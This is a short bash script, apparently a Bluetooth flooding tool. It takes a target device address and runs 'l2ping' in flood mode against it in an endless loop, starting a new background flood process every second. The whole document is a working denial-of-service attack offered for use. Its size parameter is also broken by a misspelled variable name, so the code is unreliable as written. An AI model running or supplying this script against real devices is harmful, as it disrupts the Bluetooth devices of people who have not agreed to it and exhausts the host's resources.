#!/bin/bash

target_addr=$1
packet_size=$2

if [ $# != 2 ];
then
	echo "[i] Usage: $0 <target_addr> <packet_size>"
	exit 0
fi

while true;
do
	echo "[+] Packet sent to $target_addr -- Packet size: $packet_size"
	l2ping -i hci0 -s $package_size -f $target_addr &
	sleep 1
done
